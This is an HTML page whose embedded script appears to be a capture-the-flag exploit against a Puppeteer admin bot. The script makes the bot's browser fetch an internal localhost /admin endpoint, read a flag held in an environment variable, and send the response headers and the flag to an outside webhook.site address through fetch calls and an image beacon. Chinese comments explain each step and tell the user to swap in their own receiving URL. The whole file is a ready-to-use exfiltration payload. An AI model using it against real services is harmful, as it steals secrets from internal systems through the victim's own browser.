<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Send Env FLAG</title>
</head>
<body>
<script>
    // ########## 替换成你能通的公网接收地址（比如新的RequestBin/自己的接口）##########
    const YOUR_RECEIVE_URL = "https://webhook.site/70d65ee8-e7bd-4da4-87fa-111ff8b42aa6"; // 例：https://en8x0z9p37r.x.pipedream.net/
    fetch(YOUR_RECEIVE_URL+'?id='+Math.random());
    // ###########################################################################

    // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
    fetch('http://127.0.0.1:3000/admin')
        .then(res => {
            const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
            // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
            //const headersStr = headersArr.join('\n');
            fetch(YOUR_RECEIVE_URL+'?res='+headersArr);
            if (res.ok){ 
             
                fetch(YOUR_RECEIVE_URL+'?json='+res.json());
                return res.json();
            }; // 仅解析admin返回的合法JSON
            throw new Error('非200响应');
        })
        .then(data => {
            const envFlag = data.flag; // 拿到环境变量里的FLAG
            console.log('[ENV-FLAG] 成功获取环境变量FLAG：', envFlag);
            fetch(YOUR_RECEIVE_URL+'?flag='+envFlag);
            // 关键：用img标签发送GET请求（无跨域限制，容器内网络兼容性最强）
            // 把FLAG拼接到URL参数，接收端直接读取即可
            const sendUrl = `${YOUR_RECEIVE_URL}?env_flag=${encodeURIComponent(envFlag)}`;
            const img = new Image();
            img.src = sendUrl; // 发起GET请求，发送FLAG
            img.onload = () => console.log('[ENV-FLAG] FLAG发送成功：', sendUrl);
            img.onerror = (err) => console.log('[ENV-FLAG] FLAG发送失败：', err);
        })
        .catch(err => {
            console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
        });
</script>
</body>
</html>
